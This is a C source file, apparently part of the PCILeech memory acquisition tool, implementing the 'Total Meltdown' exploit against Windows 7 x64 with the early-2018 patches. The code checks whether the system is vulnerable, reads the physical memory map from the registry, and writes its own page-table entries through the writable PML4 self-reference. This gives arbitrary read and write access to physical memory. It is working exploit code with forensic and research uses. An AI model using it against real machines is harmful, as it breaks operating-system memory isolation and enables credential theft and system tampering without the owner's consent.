// devicetmd.h : implementation related to the "total meltdown" memory acquisition "device".
//
// (c) Ulf Frisk, 2018
// Author: Ulf Frisk, pcileech@frizk.net
//
#ifdef WIN32
#include "devicetmd.h"
#include "util.h"
#include "vmm.h"

// PML4 self ref entry at position 0x1ed in Windows 7 (static offset/address)
// (this is not the case in Windows10 [which is not vulnerable...])
// ADDR_PML4 = 0xffff000000000000 | (0x1ed << (4*9+3)) | (0x1ed << (3*9+3)) | (0x1ed << (2*9+3)) | (0x1ed << (1*9+3))
#define TMD_VA_PML4                 0xFFFFF6FB7DBED000
#define TMD_VA_PML4_SELFREF         0xFFFFF6FB7DBEDF68

#pragma pack(push, 1) /* DISABLE STRUCT PADDINGS (REENABLE AFTER STRUCT DEFINITIONS) */
typedef struct tdMEMORY_RANGE {
    DWORD Reserved;
    QWORD pa;
    QWORD cb;
} MEMORY_RANGE, *PMEMORY_RANGE;
#pragma pack(pop) /* RE-ENABLE STRUCT PADDINGS */

typedef struct tdDEVICE_CONTEXT_TMD {
    QWORD vaBasePhys;
    QWORD paMax;
    QWORD iPML4ePDPT;
    PMEMORY_RANGE pMemoryRanges;
    QWORD cMemoryRanges;
    PBYTE pbMemoryRangesBuffer;
} DEVICE_CONTEXT_TMD, *PDEVICE_CONTEXT_TMD;

/*
* Retrieve the memory map from the registyr at HKLM\HARDWARE\RESOURCEMAP\System Resources\Physical Memory
* NB! Parsing is a bit sloppy and it may not work on all systems.
* Memory map retrieval is a must, since we cannot read memory belonging to memory mapped
* devices without risking of bluescreening the system. Memory map retrieval fixes this.
*/
BOOL DeviceTMD_MemoryMapRetrieve(PDEVICE_CONTEXT_TMD ctxTMd)
{
    LSTATUS status;
    HKEY hKey = NULL;
    DWORD dwRegType, cbData = 0;
    PBYTE pbData = NULL;
    QWORD c1, i, o, c2;
    PMEMORY_RANGE pMR;
    // 1: fetch binary data from registry
    status = RegOpenKeyA(HKEY_LOCAL_MACHINE, "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory", &hKey);
    if(status != ERROR_SUCCESS) { goto fail; }
    status = RegQueryValueExA(hKey, ".Translated", NULL, &dwRegType, NULL, &cbData);
    if(status != ERROR_SUCCESS || !cbData) { goto fail; }
    pbData = (PBYTE)LocalAlloc(0, cbData);
    if(!pbData) { goto fail; }
    status = RegQueryValueExA(hKey, ".Translated", NULL, &dwRegType, pbData, &cbData);
    if(status != ERROR_SUCCESS || !cbData) { goto fail; }
    RegCloseKey(hKey);
    hKey = NULL;
    // 2: translate data into memory regions
    c1 = *(PQWORD)pbData;
    if(!c1) { goto fail; }
    o = 0x10;
    c2 = *(PDWORD)(pbData + o); // this should be loop in case of c1 > 1, but works for now...
    if(!c2 || (cbData < c2 * sizeof(MEMORY_RANGE) + 0x14)) { goto fail; }
    o += sizeof(DWORD);
    pMR = (PMEMORY_RANGE)(pbData + o);
    for(i = 0; i < c2; i++) {
        pMR = (PMEMORY_RANGE)(pbData + o + i * sizeof(MEMORY_RANGE));
        if((pMR->pa & 0xfff) || (pMR->cb & 0xfff)) { goto fail; }
        if(pMR->Reserved & 0xff000000) {
            pMR->cb = pMR->cb << 8;
        }
    }
    ctxTMd->paMax = min(0x7C0000000, pMR->pa + pMR->cb); // 31 GB = max supported in this implmentation ...
    ctxTMd->cMemoryRanges = c2;
    ctxTMd->pbMemoryRangesBuffer = pbData;
    ctxTMd->pMemoryRanges = (PMEMORY_RANGE)(pbData + 0x14);
    return TRUE;
fail:
    if(hKey) { RegCloseKey(hKey); }
    if(pbData) { LocalFree(pbData); }
    return FALSE;
}

BOOL DeviceTMD_IsMemoryInRange(PDEVICE_CONTEXT_TMD ctxTMd, QWORD pa)
{
    QWORD i;
    for(i = 0; i < ctxTMd->cMemoryRanges; i++) {
        if((pa >= ctxTMd->pMemoryRanges[i].pa) && (pa < ctxTMd->pMemoryRanges[i].pa + ctxTMd->pMemoryRanges[i].cb)) {
            return TRUE;
        }
    }
    return FALSE;
}

/*
* set up a page table structure by hi-jacking 32 pages between addresses:
* 0x10000 and 0x2f000. The 0x10000 page will serve as our PDPT. The other
* 31 pages between 0x10000 and 0x2e000 will serve as our PDs which will
* map 2MB pages of physical memory. This will allow to map max 31*512*2MB
* -> 31744MB of physical address space, around 30GB with current algorithm
*/
VOID DeviceTMD_SetupPageTable(PDEVICE_CONTEXT_TMD ctxTMd)
{
    QWORD iPML4, vaPML4e, vaPDPT, iPDPT, vaPD, iPD;
    // setup: PDPT @ fixed hi-jacked physical address: 0x10000
    for(iPML4 = 256; iPML4 < 512; iPML4++) {
        vaPML4e = TMD_VA_PML4 + (iPML4 << 3);
        if(*(PQWORD)vaPML4e) { continue; }
        *(PQWORD)vaPML4e = 0x10067;
        break;
    }
    vaPDPT = 0xFFFFF6FB7DA00000 + (iPML4 << (9 * 1 + 3));
    // 2: setup 31 PDs @ physical addresses 0x11000-0x1f000 with 2MB pages
    for(iPDPT = 0; iPDPT < 31; iPDPT++) {
        *(PQWORD)(vaPDPT + (iPDPT << 3)) = 0x11067 + (iPDPT << 12);
    }
    for(iPDPT = 0; iPDPT < 31; iPDPT++) {
        vaPD = 0xFFFFF6FB40000000 + (iPML4 << (9 * 2 + 3)) + (iPDPT << (9 * 1 + 3));
        for(iPD = 0; iPD < 512; iPD++) {
            *(PQWORD)(vaPD + (iPD << 3)) = ((iPDPT * 512 + iPD) << 21) | 0xe7;
        }
    }
    ctxTMd->iPML4ePDPT = iPML4;
    ctxTMd->vaBasePhys = 0xffff000000000000 + (iPML4 << (9 * 4 + 3));
}

BOOL DeviceTMD_Identify()
{
    __try {
        return VmmTlbPageTableVerify(NULL, (PBYTE)TMD_VA_PML4, (*(PQWORD)TMD_VA_PML4_SELFREF) & 0x0000fffffffff000, TRUE);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

VOID DeviceTMD_ReadScatterDMA(_Inout_ PPCILEECH_CONTEXT ctx, _Inout_ PPDMA_IO_SCATTER_HEADER ppDMAs, _In_ DWORD cpDMAs, _Out_opt_ PDWORD pchDMAsRead)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    PDMA_IO_SCATTER_HEADER pDMA;
    DWORD i, c = 0;
    for(i = 0; i < cpDMAs; i++) {
        pDMA = ppDMAs[i];
        if(!DeviceTMD_IsMemoryInRange(ctxTMd, pDMA->qwA)) { continue; }
        __try {
            memcpy(pDMA->pb, (PBYTE)(ctxTMd->vaBasePhys + pDMA->qwA), pDMA->cbMax);
        } 
        __except(EXCEPTION_EXECUTE_HANDLER) { continue; }
        pDMA->cb = pDMA->cbMax;
        c++;
    }
    if(pchDMAsRead) {
        *pchDMAsRead = c;
    }
}

VOID DeviceTMD_ProbeDMA(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwAddr, _In_ DWORD cPages, _Inout_ __bcount(cPages) PBYTE pbResultMap)
{
    QWORD i;
    for(i = 0; i < cPages; i++) {
        pbResultMap[i] = DeviceTMD_IsMemoryInRange((PDEVICE_CONTEXT_TMD)ctx->hDevice, (qwAddr + (i << 12))) ? 1 : 0;
    }
}

BOOL DeviceTMD_WriteDMA(_Inout_ PPCILEECH_CONTEXT ctx, _In_ QWORD qwA, _In_ PBYTE pb, _In_ DWORD cb)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    if(!DeviceTMD_IsMemoryInRange(ctxTMd, qwA)) { return FALSE; }
    __try {
        memcpy((PBYTE)(ctxTMd->vaBasePhys + qwA), pb, cb);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
    return TRUE;
}

VOID DeviceTMD_Close(_Inout_ PPCILEECH_CONTEXT ctx)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)ctx->hDevice;
    if(!ctxTMd) { return; }
    __try {
        ZeroMemory((PBYTE)(ctxTMd->vaBasePhys + 0x10000), 0x20000);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { ; }
    *(PQWORD)(TMD_VA_PML4 + (ctxTMd->iPML4ePDPT << 3)) = 0;
    LocalFree(ctxTMd);
    ctx->hDevice = 0;
}

BOOL DeviceTMD_Open(_Inout_ PPCILEECH_CONTEXT ctx)
{
    PDEVICE_CONTEXT_TMD ctxTMd = (PDEVICE_CONTEXT_TMD)LocalAlloc(LMEM_ZEROINIT, sizeof(DEVICE_CONTEXT_TMD));
    if(!ctxTMd) { return FALSE; }
    // 1: Test for vulnerability and set up page tables using for virtual2physical mappings
    if(!DeviceTMD_Identify()) {
        printf(
            "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
            "  Only Windows 7 x64 with the 2018-01 or 2018-02 patches are vulnerable.\n");
        goto fail;
    }
    // 2: Retrieve physical memory map from registry
    if(!DeviceTMD_MemoryMapRetrieve(ctxTMd)) {
        printf("TOTALMELTDOWN: Failed. Failed parsing memory map from registry.\n");
        goto fail;
    }
    // 3: Exploit! == create page table mappings.
    DeviceTMD_SetupPageTable(ctxTMd);
    // 4: Set callback functions and fix up config
    ctx->hDevice = (HANDLE)ctxTMd;
    ctx->cfg->dev.tp = PCILEECH_DEVICE_TOTALMELTDOWN;
    ctx->cfg->dev.qwMaxSizeDmaIo = 0x00100000;          // 1MB
    ctx->cfg->dev.qwAddrMaxNative = ctxTMd->paMax;
    ctx->cfg->dev.fPartialPageReadSupported = TRUE;
    ctx->cfg->dev.pfnClose = DeviceTMD_Close;
    ctx->cfg->dev.pfnProbeDMA = DeviceTMD_ProbeDMA;
    ctx->cfg->dev.pfnReadScatterDMA = DeviceTMD_ReadScatterDMA;
    ctx->cfg->dev.pfnWriteDMA = DeviceTMD_WriteDMA;
    if(ctx->cfg->fVerbose) {
        printf("TOTALMELTDOWN: Successfully exploited for physical memory access.\n");
    }
    return TRUE;
fail:
    LocalFree(ctxTMd);
    return FALSE;
}

#endif /* WIN32 */
#if defined(LINUX) || defined(ANDROID)
#include "devicetmd.h"

BOOL DeviceTMD_Open(_Inout_ PPCILEECH_CONTEXT ctx)
{
    if(ctx->cfg->dev.tp == PCILEECH_DEVICE_TOTALMELTDOWN) {
        printf(
            "TOTALMELTDOWN: Failed.  System not vulnerable for Total Meltdown attack.\n" \
            "  Only Windows 7 x64 with the 2018-01 or 2018-02 patches are vulnerable.\n");
    }
    return FALSE;
}

#endif /* LINUX || ANDROID */
